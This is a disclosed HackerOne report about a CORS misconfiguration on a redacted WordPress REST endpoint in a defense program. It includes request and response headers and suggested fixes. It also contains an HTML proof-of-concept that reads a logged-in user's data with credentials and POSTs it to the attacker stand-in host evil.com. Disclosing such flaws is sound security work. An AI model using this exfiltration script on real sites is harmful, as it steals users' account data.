# (CORS) Cross-origin resource sharing misconfiguration

## Report Details
- **Report ID**: 896093
- **URL**: https://hackerone.com/reports/896093
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-06-11T14:43:58.412Z
- **Disclosed**: 2020-07-14T17:19:49.051Z

## Reporter
- **Username**: natanalves01001
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:** Affected website: **https://██████████/wp-json**

## Impact

## Step-by-step Reproduction :

1. **Send this request:**

```javascript
GET /wp-json HTTP/1.1
Host: █████████
Connection: close
Origin: http://evil.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
```
2. **Here you can see the response headers:**

```javascript
Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Credentials: true
```
3. **So you can write exploit:**

```javascript
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS PoC</h2>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://██████/wp-json/", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
4. **Save file as .html and open in and see Sensitive Information.**

**Reference Exploit used:** [Exploit WordPress-5.2.4-Cross-Origin-Resource-Sharing](https://packetstormsecurity.com/files/155011/WordPress-5.2.4-Cross-Origin-Resource-Sharing.html)

## Suggested Mitigation/Remediation Actions:
**FIX 1** - It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request.
Reference: https://github.com/WP-API/WP-API/issues/2338
**FIX 2** - It's also possible to create a rewrite rule on .htaccess (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: "^.rest_route=/wp/") to a Not Found (404) or a Default Page.

## Impact

Cross Misconfiguration -Leakage Sensitive Information

## Attachments
No attachments
